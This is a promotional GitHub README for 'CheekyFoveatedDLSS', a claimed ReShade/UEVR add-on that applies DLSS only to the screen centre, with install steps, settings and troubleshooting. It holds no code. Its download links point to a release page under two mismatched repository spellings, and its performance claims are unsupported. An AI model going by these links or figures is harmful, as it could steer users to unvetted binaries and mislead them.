# ⚡ CheekyFoveatedDLSS - Boost FPS Without Sacrificing Visual Quality

[![Download Now](https://img.shields.io/badge/Download-CheekyFoveatedDLSS-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/narrow-diospyroslotus3835/CheekyFoveatedDLSS/releases)

## 🎯 What Is CheekyFoveatedDLSS?

CheekyFoveatedDLSS is a smart performance booster for NVIDIA RTX graphics cards. It works with games that already use DLSS (Deep Learning Super Sampling) technology. Normally, DLSS upscales the entire image to improve performance. CheekyFoveatedDLSS takes this a step further by focusing the high-quality DLSS processing only on the center of your screen—where you're actually looking—while using a more efficient method for the edges. This simple trick can give you **20% or more extra FPS** in many games, with no noticeable difference in how the game looks.

Think of it like this: when you watch TV, you focus on the middle of the screen. The edges are in your peripheral vision. CheekyFoveatedDLSS applies the same logic to your gaming, saving your GPU precious work.

## 📋 What You Need Before You Start

Before downloading, make sure your computer meets these requirements:

| Requirement | Details |
|-------------|---------|
| **Operating System** | Windows 10 or Windows 11 (64-bit only) |
| **Graphics Card** | Any NVIDIA RTX GPU (2000, 3000, or 4000 series) |
| **Game** | A Direct3D 11 or Direct3D 12 game that supports DLSS Super Resolution |
| **Host Software** | Either ReShade (with full add-on support) OR UEVR (with compatible plugin API) |

**Important:** If you don't already use ReShade or UEVR, you'll need to install one of those first. CheekyFoveatedDLSS works as an add-on or plugin inside these tools.

## ✅ Which Games Work?

CheekyFoveatedDLSS works with most games that already have DLSS built in. We maintain a community-driven compatibility list where players share their experiences.

### 📊 Check the Compatibility List

[**View the Official Compatibility Spreadsheet**](https://docs.google.com/spreadsheets/d/1BY-OAfYzkDefQWvpHCd_bhzDdIYlTb6RkptmV1h70Ng/edit?usp=sharing)

This spreadsheet shows which games other users have tested. **Important note:** If a game isn't listed or appears as "not working," it doesn't mean CheekyFoveatedDLSS won't work for you. The list is based on user reports, so your experience may differ. Try it and see!

## 🚀 Getting Started

### Step 1: Download the Software

Visit this link to download the application: **[https://github.com/narrow-diospyrotus3835/CheekyFoveatedDLSS/releases](https://github.com/narrow-diospyrotus3835/CheekyFoveatedDLSS/releases)**

On that page, you'll find the latest release. Look for the file that matches your setup—there are versions for different host applications.

### Step 2: Install for Your Setup

**If you use ReShade:**
1. Download the ReShade version of CheekyFoveatedDLSS.
2. Place the downloaded file in your game's ReShade add-ons folder. This is usually located at `YourGameFolder/reshade-addons/`.
3. Start your game—CheekyFoveatedDLSS will automatically activate.

**If you use UEVR:**
1. Download the UEVR version of CheekyFoveatedDLSS.
2. Place the file in your UEVR plugins folder.
3. Launch UEVR and load your VR game as usual.

### Step 3: Enable DLSS in Your Game

Before CheekyFoveatedDLSS can work, you must enable DLSS Super Resolution in your game's graphics settings. Look for a "DLSS" option in the video/display settings and turn it on. Any quality mode (Quality, Balanced, Performance, Ultra Performance) will work.

### Step 4: Verify It's Working

When you start your game, you should see an indicator that CheekyFoveatedDLSS is active. This might be a small icon in the corner of your screen (you can turn this off in settings if you prefer). Your FPS should noticeably improve.

## 🎮 Using CheekyFoveatedDLSS in VR

This tool is particularly powerful for VR gaming on eye-tracked headsets. When combined with eye tracking, the foveated region can become even smaller than usual, unlocking even greater performance gains. This means smoother gameplay and more headroom for higher graphics settings in your VR experiences.

If you have a headset without eye tracking, don't worry—CheekyFoveatedDLSS still works well. It will simply use a slightly larger center region to account for where your eyes might wander.

## ⚙️ Adjusting Settings

You can customize how CheekyFoveatedDLSS behaves to find the perfect balance between performance and visual quality:

| Setting | What It Does | Recommended Value |
|---------|--------------|-------------------|
| **Foveated Region Size** | Controls how large the high-quality center area is | Start at 50%, adjust based on your comfort |
| **Edge Sharpness** | Affects how noticeable the transition is between center and edges | Keep at default for best results |
| **Show Overlay** | Displays a visual guide showing where the foveated region is | Turn on initially to see the effect, then turn off |

Start with the defaults. If you notice the edges of your screen look too soft, increase the foveated region size slightly. If you want even more FPS, you can decrease it.

## 🔧 Troubleshooting

### 🚫 Game Won't Start or Crashes
- Make sure you're using the latest version of ReShade or UEVR.
- Check that your game is running in Direct3D 11 or 12 mode. You can usually select this in the game's launcher.
- Try disabling the overlay in CheekyFoveatedDLSS settings if crashes persist.

### 📉 No FPS Improvement
- Verify DLSS is actually enabled in your game's settings—not just DLAA or other AI features.
- Check that you downloaded the correct version (ReShade vs. UEVR).
- Some games may require you to restart the game after enabling DLSS for the add-on to detect it.

### 👓 Visual Artifacts at Screen Edges
- This is expected behavior to some degree—the edges are rendered at lower quality.
- If it's too noticeable, increase the foveated region size.

### ❓ Game Not Listed in the Compatibility Spreadsheet
- Try it anyway! The spreadsheet is community-maintained and incomplete.
- If it works (or doesn't), please add a report to help other users.

## 💬 Get Help

If you run into issues that aren't covered in this guide:

1. Check the **Issues** section of the GitHub repository.
2. Search the community forums—other players may have found solutions.
3. When asking for help, include: your GPU model, game name, ReShade/UEVR version, and a description of the problem.

## 🧪 Performance Expectations

While results vary by game and hardware, here's what you can typically expect:

- **DLSS Performance Mode:** 20-30% FPS increase over standard DLSS
- **DLSS Quality Mode:** 10-20% FPS increase
- **VR with Eye Tracking:** Up to 50% FPS increase in some titles

The exact numbers depend on your GPU, resolution, and how sensitive you are to edge quality. Most users find the default settings provide an excellent balance.

## 📝 Final Thoughts

CheekyFoveatedDLSS is a free, open-source tool created by passionate modders. It's perfect for anyone who wants to squeeze more performance out of their RTX GPU without dealing with complicated configuration files or technical setup processes. If you can install a mod for a game, you can use this tool.

Download it today, and give your games a performance boost that you'll actually see—and barely notice visually. Your eyes focus on the center of the screen anyway, so why waste GPU power on the edges?

[![Download Now](https://img.shields.io/badge/Download-Latest_Release-4CAF50?style=for-the-badge&logo=github&logoColor=white&color=FF9800)](https://github.com/narrow-diospyrotus3835/CheekyFoveatedDLSS/releases)

---

Keywords: DLSS, Foveated Rendering, ReShade Add-on, UEVR Plugin, Performance Boost, NVIDIA RTX, VR Optimization, Direct3D 11, Direct3D 12, Eye Tracking, Graphics Mod, FPS Increase